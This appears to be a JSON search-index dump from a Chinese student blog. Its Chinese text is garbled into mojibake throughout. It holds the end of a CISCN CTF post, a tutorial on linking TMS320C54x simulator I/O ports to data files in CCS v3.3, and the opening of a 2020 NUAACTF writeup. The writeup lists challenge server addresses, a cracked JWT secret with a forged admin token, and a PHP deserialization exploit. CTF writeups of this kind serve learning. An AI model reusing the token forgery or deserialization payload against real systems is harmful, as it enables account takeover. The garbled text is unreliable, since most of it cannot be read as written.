èƒ½åšçš„ä¸ä»…ä»…å¯ä»¥ç”¨æ¥è·‘ SageMathï¼Œè¿˜æœ‰ Jupyter notebook, Linux terminal, X11 desktop, LaTeX document ç­‰ç­‰ï¼Œåœ¨çº¿å…è´¹ç”¨ï¼Œç™»å½•è¿˜èƒ½ä¿å­˜å·¥ä½œçŠ¶æ€ï¼Œæ„Ÿè§‰æŒºå®ç”¨çš„å‘¢ã€‚ References &amp; Extensive Reading Z3Pyåœ¨CTFé€†å‘ä¸­çš„è¿ç”¨ Z3 å­¦ä¹ ç¬”è®° CTF ä¸­çš„ LFSR æ·±å…¥åˆ†æCTFä¸­çš„LFSRç±»é¢˜ç›®ï¼ˆä¸€ï¼‰ æ·±å…¥åˆ†æCTFä¸­çš„LFSRç±»é¢˜ç›®ï¼ˆäºŒï¼‰ etc. ï¼ˆå…ˆæºœäº†","path":"2020/08/27/CTF_2020CISCN_preliminary/"},{"title":"DSP | CCS v3.3 åˆ©ç”¨I/Oç«¯å£ä»å¤–éƒ¨æ–‡ä»¶ä¼ é€æ•°æ®çš„ç›¸å…³é…ç½®","text":"å¼•è¨€å–µå‘œï¼Œä¸çŸ¥ä¸è§‰æœ‰ä¸€ä¸ªå¤šæœˆæ²¡æ¥å†™ä¸œè¥¿äº†ï¼ˆæ‘Šæ‰‹ è€ƒè¯•æœˆä¹Ÿå¤ªéš¾ç†¬äº†å§ï¼ˆå¤´ç§ƒ.gifï¼‰ï¼å•Šå•Šå•Šç»ˆäºè¿‡æ¥äº†ï¼ æ¯ä¸ªæœŸæœ«éƒ½å¾ˆéš¾è¿‡ï¼Œä½†è¿™ä¸ªæœŸæœ«æ€•æ˜¯æœ€éš¾å—æœ€ç„¦è™‘çš„ä¸€ä¸ªäº†ï¼Œä¸»è¦æ˜¯ä¸€å †äº‹æƒ…å…¨å †åˆ°äº†è€ƒè¯•æœˆç”šè‡³æœ€åçš„æ‰å †è€ƒè¯•å‘¨ã€‚äº”é—¨çº¿ä¸Šè€ƒè¯•æœ‰å››é—¨æ˜¯ä¸¤é—¨ä¸¤é—¨è¿ç€è€ƒçš„ï¼ŒæœŸé—´è¿˜æœ‰å„ç§è¯¾ç¨‹çš„å®éªŒï¼ˆåŠå®éªŒæŠ¥å‘Šï¼‰ã€å¤§ä½œä¸šï¼ˆåŠå…¶æŠ¥å‘Šï¼‰ã€ç»“è¯¾æŠ¥å‘Šã€ç½‘è¯¾è€ƒè¯•ï¼Œä»¥åŠé›¶é›¶æ•£æ•£çš„æ‚äº‹ balabalaã€‚è€ƒå‰èµ¶ç€ ddl ä¸€å¤©å†™äº†ä¸¤ç¯‡åŠæŠ¥å‘Šï¼Œç„¶åæŒ¤ç€æ—¶é—´ç–¯ç‹‚ å¤ é¢„ä¹ è€ƒè¯•è¯¾ç¨‹ï¼Œäººéƒ½è¦æ²¡äº†â€¦â€¦ è¿™å­¦æœŸé€‰äº†ä¸€é—¨ DSP åŸç†ä¸åº”ç”¨ é€‰ä¿®è¯¾ï¼Œäº²èº«æ„Ÿå—è¯æ˜è¿™é—¨è¯¾å¤ªéš¾äº†ï¼Œå”‰ï¼Œåæ‚”æ²¡é€€æ‰å“­å”§å”§ã€‚ è¿™ä¸ªå¤§ä½œä¸šå¤ªéš¾åšäº†å‘€ï¼ä¹‹å‰æŠ˜è…¾äº†å¥½ä¹…åšä¸å‡ºæ¥ï¼Œæ‹–ç€æ‹–ç€å°±æœ‰ç‚¹ä½›ç³»äº†ï¼ˆï¼ˆ åšè¿™ä¸ª DSP å¤§ä½œä¸šéœ€è¦ç”¨åˆ° CCS è½¯ä»¶ï¼Œå°±æ˜¯è¾£ä¸ª TI å‡ºçš„ Code Composer Studio é›†æˆå¼€å‘ç¯å¢ƒ (IDE)ï¼Œç„¶è€Œæ˜¯ç”¨å¤è€çš„ v3.3 ç‰ˆæœ¬ï¼æ®è€å¸ˆæ˜¯å› ä¸ºç”¨åˆ°çš„æ˜¯ DSP å‹å·ä¸º TMS320C54x ç³»åˆ—ï¼Œè€Œè¿™ä¸ªç³»åˆ—åªæœ‰åœ¨è¿™ä¸€ç‰ˆæœ¬ä¸Šæ‰æœ‰æ”¯æŒã€‚å•Šæ˜¯æŒºå¤è€çš„äº†ã€‚ å»å®˜ç½‘çœ‹äº†çœ‹ï¼Œç°åœ¨æœ€æ–°çš„æ˜¯ 11 Jun 2020 å‘å¸ƒçš„ 10.1.0.00010ã€‚ åˆå»ç¿»äº†ç¿» CCS ç‰ˆæœ¬å†å²é¡µé¢ï¼Œæ‹‰åˆ°æœ€ä¸‹é¢æ‰æ‰¾åˆ°äº† V3.3 ç‰ˆæœ¬ï¼Œä½›äº†ï¼ŒCCSv4.0.xæ˜¯2009å¹´å‘å¸ƒçš„ï¼Œé‚£ v3.3 å²‚ä¸æ˜¯æ›´å¤è€â€¦â€¦ æ®è¯´è¿™ä¸ªè½¯ä»¶åªæ”¯æŒ 32 ä½æ“ä½œç³»ç»Ÿï¼Œäºæ˜¯å…ˆåœ¨è™šæ‹Ÿæœºé‡Œæ•´äº†ä¸ª Windows 7 32bit ç³»ç»Ÿï¼Œç„¶åæ‰è£…ä¸Šè¿™å¤è‘£ emmmã€‚ è€Œå¯¹äºåˆ©ç”¨ Simulator çš„ I/O ç«¯å£ä»å¤–éƒ¨æ–‡ä»¶ä¼ é€æ•°æ®çš„æ–¹æ³•ï¼ŒæŸ¥äº†å„ç§èµ„æ–™å‡ ä¹æ²¡æœ‰ç›¸å…³ä»‹ç»ï¼Œæœ€åæ˜¯åœ¨è€å¸ˆå’Œå°ä¼™ä¼´çš„æŒ‡å¯¼å’Œæç¤ºä¸‹ï¼Œæ‰å®ç°äº†è¿™ä¸€æ“ä½œã€‚ é‚£æ­£å¥½å°±æ¥è®°å½•ä¸€ä¸‹å§ï¼Œå¸Œæœ›å¯¹å­¦å¼Ÿå­¦å¦¹ä»¬æœ‰ç‚¹å¸®åŠ©ï¼ˆå¦‚æœçœ‹åˆ°çš„è¯ï¼‰ï¼Œä¹Ÿå¯¹æƒ³è¦ä»äº‹ç›¸å…³ç ”ç©¶çš„è¯»è€…æœ‰æ‰€å¯å‘ã€‚ æ–¹æ³•ä»‹ç»å†æ‰¯å‡ å¥å§ã€‚é¦–å…ˆæ˜¯æŠŠæ•™æä¸Šå…³äº CCS ä½¿ç”¨çš„ä»‹ç»è¿‡äº†ä¸€éã€‚ æ•™æç¬¬ä¸‰ç‰ˆï¼šbalabala è¯¦è§ 4.7.3 å°èŠ‚ï¼Œç„¶è€Œå¹¶æ²¡æœ‰è¿™ä¸€èŠ‚ï¼ˆä¼°è®¡å†ç‰ˆçš„æ—¶å€™æ²¡æ”¹ï¼‰ã€‚ ç¿»å‡ºç¬¬ä¸€ç‰ˆç”µå­ç‰ˆï¼Œå‚»äº†ï¼Œ2001å¹´çš„ç‰ˆæœ¬ï¼Œé‚£æ—¶å€™è¿˜æ²¡ç”¨ CCSï¼Œæ˜¯ç”¨å‘½ä»¤è¡Œæ¨¡æ‹Ÿçš„â€¦â€¦ ç½‘ä¸Šæ‰¾äº†å„ç§èµ„æ–™ï¼Œä¹Ÿæ²¡å…·ä½“ä»‹ç»ï¼Œè¦ä¸ç„¶å°±æ˜¯åˆ©ç”¨ Cè¯­è¨€ï¼ˆè€Œä¸æ˜¯æ±‡ç¼–ï¼‰æ¥ç¼–å†™çš„ä»£ç ï¼Œè¿™ä¸ªå¯¼å…¥æ•°æ®çš„æ–¹æ³•åˆä¸ä¸€æ ·ï¼Œæ˜¯åœ¨Cè¯­è¨€ä¸­ç›¸åº”çš„è¯­å¥æ‰“ä¸Šæ–­ç‚¹ï¼Œè€Œåä¿®æ”¹æ–­ç‚¹çš„æ¡ä»¶ä¸ºè¯»å–/å†™å…¥æ•°æ®æ¥å®ç°çš„ã€‚ çœ‹äº†ä¸€éæš‘å‡è¦è¡¥åšçš„ DSP å®éªŒçš„æŒ‡å¯¼ä¹¦ï¼Œè²Œä¼¼ä»‹ç»çš„æ˜¯æ›´å¤è€çš„ CCS 2.x ç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬åˆä¸ä¸€æ ·ï¼Œè¯•äº†ä½†æ•°æ®å¹¶æ²¡æœ‰æˆåŠŸè¾“å…¥ï¼Œåˆæ€€ç–‘æ˜¯è¾“å…¥æ–‡ä»¶æ ¼å¼çš„é—®é¢˜ã€‚â€¦â€¦ åˆ°äº†æœ€åï¼Œåœ¨å°ä¼™ä¼´æç¤ºä¸‹ï¼Œæ‰¾åˆ°äº†è€å¸ˆåœ¨ç¾¤é‡Œå‘çš„æ‹çš„å‡ é¡µè¯¾æœ¬ã€‚æ‰çŸ¥é“åŸæ¥æ˜¯ç¬¬äºŒç‰ˆè¯¾æœ¬çš„ 4.7.3 å°èŠ‚é‡Œåšäº†ä»‹ç»â€¦â€¦ï¼ˆå¤´ç§ƒ å…¶å®å°±æ˜¯å°† I/O å£çš„åœ°å€ä¸å¤–éƒ¨çš„æ•°æ®æ–‡ä»¶ç›¸å…³è”ã€‚å‚è€ƒç¬¬äºŒç‰ˆè¯¾æœ¬ï¼Œå…·ä½“çš„å®ç°çš„æ­¥éª¤å¦‚ä¸‹ã€‚ Step 1 ä¿®æ”¹ GEL æ–‡ä»¶ CCS çš„ GEL è¯­è¨€ï¼ˆé€šç”¨æ‰©å±•è¯­è¨€ï¼‰æ˜¯ä¸€ç§äº¤äº’å¼çš„å‘½ä»¤ï¼Œå®ƒæ˜¯è§£é‡Šæ‰§è¡Œçš„ï¼Œå³ä¸èƒ½è¢«ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚å®ƒçš„ä½œç”¨åœ¨äºæ‰©å±•äº† CCS çš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨ GEL æ¥è°ƒç”¨ä¸€äº›èœå•å‘½ä»¤ï¼Œå¯¹DSPçš„å­˜å‚¨å™¨è¿›è¡Œåˆå§‹åŒ–é…ç½®ç­‰ã€‚ é€šè¿‡ä¿®æ”¹ GELæ–‡ä»¶ï¼Œå®šä¹‰ I/O ç«¯å£åœ°å€æ˜ åƒã€‚ åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­å°†è¾“å‡ºç«¯å£ PA0 æ˜ å°„åˆ° 0x0000ï¼Œå°†è¾“å…¥ç«¯å£ PA1 æ˜ å°„åˆ° 0x0001ã€‚ å³åœ¨ C5402_Init() å‡½æ•°ä¸­åŠ å…¥ä¸‹é¢çš„è¯­å¥ã€‚ GEL_MapAdd(0x0001,2,1,1,0); /* I/O Read */ GEL_MapAdd(0x0000,2,1,0,1); /* I/O Write */ å…·ä½“å«ä¹‰æ˜¯ GEL_MapAdd(address, page, length, readable, writeable); address ç«¯å£åœ°å€å€¼ã€‚ page å­˜å‚¨ç©ºé—´å€¼ã€‚0ï¼šç¨‹åºç©ºé—´ï¼Œ1ï¼šæ•°æ®ç©ºé—´ï¼Œ2ï¼šI/O ç©ºé—´ã€‚ length åœ°å€ç©ºé—´é•¿åº¦ã€‚å¯¹äº I/O ç«¯å£ä¸€èˆ¬å–ä¸º1ã€‚ readable å¯è¯»æ ‡å¿—ã€‚1å¯è¯»ï¼Œ0ä¸å¯è¯»ã€‚ writeable å¯å†™æ ‡å¿—ã€‚1å¯å†™ï¼Œ0ä¸å¯å†™ã€‚ ä¿®æ”¹åçš„ç»“æœå¦‚å›¾æ‰€ç¤ºã€‚ Step 2 Reload GEL Fileè¯·æ³¨æ„ï¼Œä¸€å®šè¦é‡æ–°åŠ è½½ GEL é…ç½®æ–‡ä»¶ï¼Œå¦åˆ™è¿™ä¸ªé…ç½®æ˜¯ä¸ç”Ÿæ•ˆçš„ã€‚ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªæ‰å‘é‡Œçš„ å…·ä½“æ–¹æ³•å°±æ˜¯åœ¨å·¦è¾¹çš„æ–‡ä»¶åˆ—è¡¨é‡Œè¿™ä¸ª gel æ–‡ä»¶ä¸Šå³é”®ï¼Œç‚¹å‡» Reload å³å¯ã€‚ å½“ç„¶ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œé‚£å°±æ˜¯é‡å¯ CCS è½¯ä»¶ã€‚å®åœ¨ä¸è¡Œé‡å¯ç³»ç»Ÿä¹Ÿè¡Œ 23333. ï¼ˆé‡å¯è§£å†³ç»å¤§éƒ¨åˆ†é—®é¢˜å‘¢ï¼ Step 3 Port Connectç‚¹å‡»èœå•æ ä¸‹çš„ Tools - Port Connectã€‚å»ºç«‹ç«¯å£ä¸æ–‡ä»¶ä¹‹é—´çš„è¿æ¥ã€‚ ç«¯å£è®¾ç½®å¦‚ä¸‹ã€‚ Port å³åœ¨ Step 1 ä¸­è®¾ç½®çš„ç«¯å£ï¼Œ0x01 ä¸ºè¾“å…¥ç«¯å£ï¼Œ0x00 ä¸ºè¾“å‡ºç«¯å£ã€‚Typeä¹Ÿç›¸åº”è®¾ç½®ã€‚ Length è®¾ç½®ä¸º1ã€‚ Page è®¾ç½®ä¸º I/Oã€‚ ç‚¹å‡»OKä¹‹åä¼šå¼¹å‡ºæ–‡ä»¶é€‰æ‹©çª—å£ï¼Œé€‰æ‹©ä½ è¦å¯¼å…¥/å¯¼å‡ºæ•°æ®çš„æ–‡ä»¶å³å¯å•¦ï¼ å™¢å¯¹äº†ï¼Œè¿™é‡Œæä¸€å¥ï¼Œè¿™ä¸ªæ–‡ä»¶çš„æ ¼å¼æ˜¯æ¯è¡Œä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°æ®ï¼Œæ•°æ®é•¿åº¦ä¸º16ä½ï¼Œä¸å¸¦å‰å¯¼ç¬¦0xï¼Œå³å½¢å¼ä¸º xxxxï¼Œxä¸º 0-F ä¹‹é—´çš„æ•°ã€‚ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ è¿™ä¸ªæ ¼å¼ä¸åˆ©ç”¨æ–­ç‚¹è¾“å…¥è¾“å‡ºæ•°æ®çš„æ ¼å¼ä¸åŒï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼ï¼ˆé‚£ä¸ªæ˜¯é¦–è¡Œæœ‰æ ¼å¼æ ‡è¯†çš„ï¼Œ1651 balabalaï¼‰ Step 4 ç¡®è®¤è¿æ¥åœ¨ä¸‹æ–¹ä¼šæœ‰ä¸€ä¸ªæ–°çš„çª—å£ï¼Œé…ç½®å¥½åçš„çŠ¶æ€å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ å¯ä»¥é€šè¿‡ Connect å’Œ Disconnect æŒ‰é’®æ¥å»ºç«‹/å–æ¶ˆç«¯å£è¿æ¥ã€‚ è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå†™å…¥çš„æ–‡ä»¶ï¼Œåœ¨æ–­å¼€è¿æ¥ä¹‹å‰ï¼Œéƒ½æ˜¯ä¸€ç›´è¢« CCS å ç”¨ç€çš„ï¼Œè€Œä¸”å¹¶æ²¡æœ‰å®æ—¶å†™å…¥æ–‡ä»¶ï¼ ï¼ˆç›²çŒœå¯èƒ½åœ¨è¾“å‡ºç¼“å­˜ä¸­ï¼Ÿå ç”¨äº†æ–‡ä»¶å¥æŸ„ä½†æ²¡æœ‰ flushï¼Ÿï¼‰ å› æ­¤è¦æƒ³çœ‹åˆ°ç»“æœçš„è¯ä¸€ç§æ–¹æ³•æ˜¯æ–­å¼€è¾“å‡ºæ–‡ä»¶ï¼Œå¦ä¸€ç§æ–¹æ³•ï¼Œå…³æ‰ CCSï¼ˆç®€å•ç²—æš´ã€‚ Step 5 åœ¨æ±‡ç¼–ä¸­ä½¿ç”¨ç«¯å£é¦–å…ˆå®šä¹‰è¾“å…¥è¾“å‡ºç«¯å£å¦‚ä¸‹ã€‚ PA0 .set 0 ;0å£ è¾“å‡º PA1 .set 1 ;1å£ è¾“å…¥ è€Œåç»“åˆ PORTRã€PORTW ç­‰å‘½ä»¤ä½¿ç”¨ç«¯å£å³å¯ã€‚ PORTR PA1,@x PORTW @y,PA0 å¥½äº†ï¼Œå¤§æ¦‚å°±è¿™äº›äº†å–µ~ ä¸€ç§ç®€åŒ–æ–¹æ³•å™¢å¯¹äº†ï¼Œä¹¦ä¸Šè¿˜ç»™å‡ºäº†ä¸€ç§æ›¿ä»£æ–¹æ¡ˆï¼Œå¯ä»¥ç®€åŒ–å‰è¿°æ–¹æ³•çš„ Step 3. å°±æ˜¯åœ¨ GEL æ–‡ä»¶åˆå§‹åŒ–å‡½æ•°ä¸­å†åŠ å…¥ä¸‹é¢çš„è¯­å¥ï¼Œç›´æ¥å»ºç«‹ç«¯å£çš„è¿æ¥ã€‚ GEL_PortConnect(0x0001,2,1,0x01,\"C:\\\\ti\\\\C54x\\\\in.dat\"); GEL_PortConnect(0x0000,2,1,0x02,\"C:\\\\ti\\\\C54x\\\\out.dat\"); å…·ä½“å«ä¹‰æ˜¯ GEL_PortConnect(portAddress, page, length, accessType, fileName); portAddress ç«¯å£åœ°å€å€¼ã€‚ page å­˜å‚¨ç©ºé—´å€¼ã€‚0ï¼šç¨‹åºç©ºé—´ï¼Œ1ï¼šæ•°æ®ç©ºé—´ï¼Œ2ï¼šI/O ç©ºé—´ã€‚ length åœ°å€ç©ºé—´é•¿åº¦ã€‚å¯¹äº I/O ç«¯å£ä¸€èˆ¬å–ä¸º1ã€‚ accessType å­˜å–ç±»å‹ã€‚1ä¸ºè¯»å–ï¼ˆè¾“å…¥ï¼‰ï¼Œ2ä¸ºå†™å…¥ï¼ˆè¾“å‡ºï¼‰ã€‚ fileName å¤–éƒ¨æ•°æ®æ–‡ä»¶åã€‚æ³¨æ„æ˜¯ç»å¯¹åœ°å€ï¼Œç›®å½•è¦ç”¨åŒæ–œæ ã€‚ ï¼ˆä¸è¿‡è¿™ä¸ªåŠæ³•æˆ‘ä¹Ÿæ²¡è¯•è¿‡ï¼Œä¸æ¸…æ¥šæ€ä¹ˆæ ·å–µ ï¼ˆä¹Ÿå°±æ˜¯ç®€åŒ–äº†é‚£ä¸ªç«¯å£è¿æ¥çš„æ“ä½œè€Œå·²å•¦ å…¶ä»–ä¸€äº› tipsä¹Ÿç®—æ˜¯ç¢ç£¨å‡ºæ¥çš„/è°ƒæ•™å‡ºæ¥çš„ä¸€äº›ç»éªŒå§â€¦â€¦å¤´ç§ƒã€‚ æ¯æ¬¡ä¿®æ”¹æ±‡ç¼–ç¨‹åºï¼ŒRebuild ä¹‹åï¼Œéƒ½è¦è®°å¾— Reload Programï¼ˆå½“ç„¶ç¬¬ä¸€æ¬¡è·‘ç¨‹åºçš„è¯å°±æ˜¯ Load Program äº†2333ï¼‰ï¼Œå°†è¾“å‡ºçš„ out æ–‡ä»¶åŠ è½½åˆ° Simulator ä¸­è¿›è¡Œä»¿çœŸè°ƒè¯•ã€‚ ç”»å›¾çš„æ—¶å€™ï¼Œæ¯è¿è¡Œå®Œä¸€éç¨‹åºï¼Œéƒ½è¦é‡æ–°å¯åŠ¨ï¼ˆRestartï¼‰ï¼Œä¸ç„¶å•¥ä¹Ÿæ²¡æœ‰å˜åŒ–ï¼Œæˆ–è€…ä¼šå‡ºç°å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æ˜¯ä»£ç è®¾è®¡ä¸Šçš„é—®é¢˜äº†ã€‚ ç”»å›¾çš„è¯å¿…é¡»è¦åœ¨åœä¸‹æ¥ï¼ˆhaltï¼‰çš„æ—¶å€™æ‰èƒ½ç»˜åˆ¶ï¼Œä¸ç„¶æ²¡å˜åŒ–ã€‚è¿™é‡Œå¯ä»¥åœ¨ç¨‹åºä¸­åŠ å…¥æ–­ç‚¹æ¥å®ç°ã€‚æˆ‘å»ºè®®çš„è¯è¿˜å¯ä»¥åœ¨è¾“å‡ºæ•°æ®çš„ä½ç½®æ‰“ä¸ªæ–­ç‚¹ï¼Œç„¶åé€‰é¡¹é€‰æ‹©æ›´æ–°æ‰€æœ‰çª—å£ï¼ˆUpdate all windowsï¼‰ï¼Œè¿˜æ˜¯å« Refresh Window æ¥ç€ï¼Œæ„Ÿè§‰ä¸Šæ˜¯æœ‰ç”¨çš„å¯è¡Œçš„ã€‚è€Œååœ¨æœ€åç¨‹åºç»“æŸæ­»å¾ªç¯é‚£é‡Œå†æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œè¿™æ ·è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨åœ¨ç»“æŸæ—¶åœä¸‹ï¼ŒæŠŠå›¾ç”»å‡ºæ¥äº†ï¼ï¼ˆå½“ç„¶ç„å­¦æƒ…å†µå°±ä¸å¥½è¯´äº†23333ï¼‰ â€¦â€¦ åæ­£ç»å¸¸ Reload å°±å®Œäº‹äº† hhhhhã€‚ è¿™ä¸ªç‰ˆæœ¬çš„è½¯ä»¶ç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯ï¼ŒåŠŸèƒ½å®ç°çš„è®¾è®¡ä¸Šååˆ†ä¸å‹å¥½ï¼Œç”¨æˆ·ä½“éªŒå°±æ„Ÿè§‰æŒºè ¢çš„ã€‚ ä¸è¿‡æ¯•ç«Ÿæ˜¯å¤šå¤è€çš„ç‰ˆæœ¬å‘¢ï¼ BTWï¼Œä¹‹å‰è¿˜ç”¨è¿‡ CCS v9.x ç‰ˆæœ¬å¼€å‘ MSP432 ä¹‹ç±»çš„ MCUï¼Œå½“æ—¶ç”¨Cè¯­è¨€å¼€å‘ï¼Œä¸»è¦æ˜¯ MCU å‡½æ•°æ¥å£çš„èµ„æ–™æ¯”è¾ƒå°‘ï¼Œåªæœ‰å®˜æ–¹è‹±æ–‡æ–‡æ¡£ï¼Œé‚£æ—¶ç½‘ä¸Šè¿˜æ²¡æœ‰å¤šå°‘å…³äºé‚£æ¬¾ MCU çš„ä½¿ç”¨ç»éªŒï¼ˆç°åœ¨ä¸æ¸…æ¥šäº†ï¼‰ï¼Œå°±æ¯”è¾ƒéš¾å—ï¼Œä½†ç›¸æ¯”è€Œè¨€è½¯ä»¶ä½¿ç”¨æ„Ÿè§‰ä¸Šå°±å¥½å¤šäº†ã€‚å¯èƒ½æ˜¯æ–°ç‰ˆæœ¬æ¢äº†åŸºäº Eclipse å¼€æºè½¯ä»¶æ¡†æ¶æ¥åšç•Œé¢çš„åŸå› å§ 23333333ã€‚ å°±è¿™æ ·å§ã€‚ ï¼ˆæºœäº†å–µ~ ReferenceCode Composer Studio é›†æˆå¼€å‘ç¯å¢ƒ (IDE)ï¼ˆTI å®˜ç½‘ï¼‰ æˆ´æ˜æ¡¢, å‘¨å»ºæ±Ÿ. TMS320C54x DSP ç»“æ„ã€åŸç†åŠåº”ç”¨(ç¬¬2ç‰ˆ)[M]. åŒ—äº¬:åŒ—äº¬èˆªç©ºèˆªå¤©å¤§å­¦å‡ºç‰ˆç¤¾.","path":"2020/07/11/Tips_CCS_RWDataFromPort/"},{"title":"CTF | 2020 NUAACTF å¸å–µå–µé˜Ÿ Writeup","text":"å¼•è¨€å¸å–µå–µï¼Œå†²å†²å†²ï¼ æœŸå¾…å·²ä¹…çš„ 2020 NUAACTF ç»ˆäºæ¥äº†å‘€ï¼ ç©(å¤´)è€(ç§ƒ)äº†ä¸€ä¸ªä¸‹åˆï¼Œæ•´ä½“è€Œè¨€æ„Ÿè§‰ä¸Šéš¾åº¦é›¨éœ²å‡æ²¾ï¼Œç„¶è€ŒæŒºèŒ«ç„¶çš„ã€‚ æœ€åç»ˆäºå†²åˆ°äº†æ ¡å†…ç¬¬äºŒï¼Œæ„Ÿè§‰å¥½æ£’å•Šï¼ è¿™ç¯‡ Writeup æ˜¯ç”±å¸å–µå–µé˜Ÿå…±åŒå®Œæˆçš„ï¼Œæˆ‘ä¸»è¦çœ‹çš„æ˜¯ Miscã€Cryptoã€Reverseï¼ˆåæ­£å°±éšç¼˜çœ‹2333ï¼‰ï¼Œä¿©é˜Ÿå‹ @Noname å’Œ @Sophia æ‰“ Web å’Œ Pwnï¼Œéƒ½æŒºè¾›è‹¦çš„ã€‚ åœ¨æ­¤åŸºç¡€ä¸Šæˆ‘åŠ äº†ç‚¹è‡ªå·±çš„æ„Ÿå—ä»€ä¹ˆçš„å§ã€‚ ä¹‹åå¤ç°çš„æ—¶å€™å†åŠ ç‚¹ä¸œè¥¿å§ï¼ˆå’•ã€‚ Result ä¸Šé¢æ˜¯ ä¸åˆ†/åˆ† æ ¡å†…å¤– çš„éƒ¨åˆ†æ¦œå•ã€‚ æ ¡å¤–é€‰æ‰‹å¤ªå¼ºäº†å•Šå•Šå•Šå•Šï¼ï¼ˆå¤ªé˜”æ€•äº†å˜¤å˜¤å˜¤ï¼‰ æ ¡å†…è¿˜ç®—å‹å¥½ï¼Œä½†æœ€åä¸€ä¸ªå°æ—¶æƒŠå¿ƒåŠ¨é­„ï¼Œæ’ååœ¨2-4ä½ä¹‹é—´æ³¢åŠ¨ã€‚ æœ€åå‡ åˆ†é’Ÿé˜Ÿå‹å†²äº†ä¸€æ³¢ pwnï¼Œå†²åˆ°äº†ç¬¬äºŒï¼Œå¤ªæ£’äº†ï¼ æ¯”èµ›å¼€å§‹ä¸€ä¸ªå°æ—¶è¿˜æ²¡æ°é¥­ï¼Œé‚£æ—¶å€™çœ‹äº†çœ‹æ”¾å‡ºæ¥çš„é¢˜ï¼Œé©¬ä¸Šæœ‰æ€è·¯èƒ½åšçš„éƒ½å·®ä¸å¤šäº†ï¼Œç„¶åå°±å»æ°äº†ä¸ªé¥­ã€‚ å›æ¥åˆ°æ¯”èµ›ç»“æŸè¿™ä¸­é—´å‡ ä¸ªå°æ—¶ï¼ŒçœŸ çš„ å¤´ ç§ƒï¼Œåˆå›°åˆç´¯åˆæ— åŠ©ï¼Œå°±æ˜¯å¥½å¤šé¢˜çœ‹ä¸Šå»èƒ½åšä½†åšä¸å‡º flag é‚£ç§â€¦â€¦é¡ºæ‰‹æ‰“å¼€äº†éŸ³ä¹èˆ’ç¼“ä¸€ä¸‹å¿ƒæƒ…ã€‚ å¹³å°ä¿¡æ¯http://47.102.118.76:8000 éƒ¨åˆ†é¢˜ç›®ç¯å¢ƒä¿¡æ¯ï¼š web1 checkin:http://139.9.221.0:8086/ å·²éƒ¨ç½² web2 jwt :http://139.9.221.0:8090/ å·²éƒ¨ç½² web3 easypophttp://139.9.221.0:8088/ å·²éƒ¨ç½² web4 command inj:http://139.9.221.0:8092/ å·²éƒ¨ç½² web5-escapehttp://139.9.221.0:8094/ å·²éƒ¨ç½² misc3-babyhttp å·²éƒ¨ç½²106.14.153.173 8443 pwn1-first-pwn49.235.243.206 10501https://share.weiyun.com/qoaVHGg8 pwn2-baby-format49.235.243.206 10502https://share.weiyun.com/efHNDo4X pwn3-baby-rop49.235.243.206 10503https://share.weiyun.com/gwHWgypr pwn4-easy-heap49.235.243.206 10504https://share.weiyun.com/uh36Y68j pwn5-easy-format49.235.243.206 10505https://share.weiyun.com/0zDGYyYw pwn6-baby-shellcode49.235.243.206 10506https://share.weiyun.com/HLUP79Fs å®˜æ–¹æºç  GitHub ä»“åº“åœ¨è¿™é‡Œã€‚ Webweb1-checkinçœ‹æºç ç›´æ¥å‡ºflag BTWï¼Œè¿™ä¸ªå›¾æˆ‘æœ€æ—©æ˜¯åœ¨ä»¥å‰çš„äº”å››è¯„ä¼˜ç½‘ç«™ä¸Šçœ‹åˆ°çš„ï¼Œç°åœ¨é‚£ä¸ªç³»ç»Ÿå·²ç»ä¸å†ä½¿ç”¨äº†ã€‚é‚£æ—¶å€™æ­£å¥½è®¤è¯†äº†äºè€æ¿å“ˆå“ˆå“ˆå“ˆã€‚ï¼ˆå¹ä¸€æ³¢ï¼ web2-jwté€šè¿‡å·¥å…· c-jwt-crack å¾—åˆ° key key:NuAa åœ¨çº¿å¹³å°æ„é€  jwt https://jwt.io/ å¾—åˆ° JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SYQ-AGwY5XIcxY621ToK8zEgomHE0Bla9tAUWTLxnwA æ”¹ jwt ç™»å½• admin è´¦å·å³å¯å¾—åˆ°flagã€‚ è€—å‡ é”…é”…å¤ªå¼ºäº†ï¼ web3-easypopæ‰“å¼€é¢˜ç›®ç›´æ¥å‡ºæºç  Exp: &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new evil(); } } class evil { private $data; } echo urlencode(serialize(new lemon())); ?&gt; æŠŠç»“æœç›´æ¥ä¼ å‚ç»™dï¼Œå‡ºflagã€‚ Miscmisc1-å‡ç¬‘ç”·å­©gayæœ¨çš„å¾®ç¬‘ï¼ˆé›¾ é¢˜ç›®éƒ½æç¤ºäº†å‡ç¬‘äº†ï¼Œæ€»å¾—çœ‹åˆ°ç¬‘å®¹å˜›ã€‚ ç›´æ¥ PNG æ”¹é«˜åº¦å°±å®Œäº‹äº†ã€‚ äºæ˜¯flagï¼š flag{i_want_jiamu_power} æˆ‘æƒ³è¦å˜‰æœ¨çš„åŠ›é‡ï¼ misc2-wiresharkç›´æ¥æ‹¿ wireshark æ‰“å¼€ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸ªæ–‡ä»¶å†…å®¹å°±æ˜¯ flag å‘¢ï¼ nuaactf{wir2sha4k_1s_gReat} misc3-babyhttp ä½ çŸ¥é“ä»€ä¹ˆæ˜¯ HTTP å—ï¼Ÿ ï¼ˆä½ é€šè¿‡ä¸€èˆ¬æ–¹å¼æ˜¯æ‰“ä¸å¼€ç½‘ç«™çš„ï¼‰ Hint: The newest. 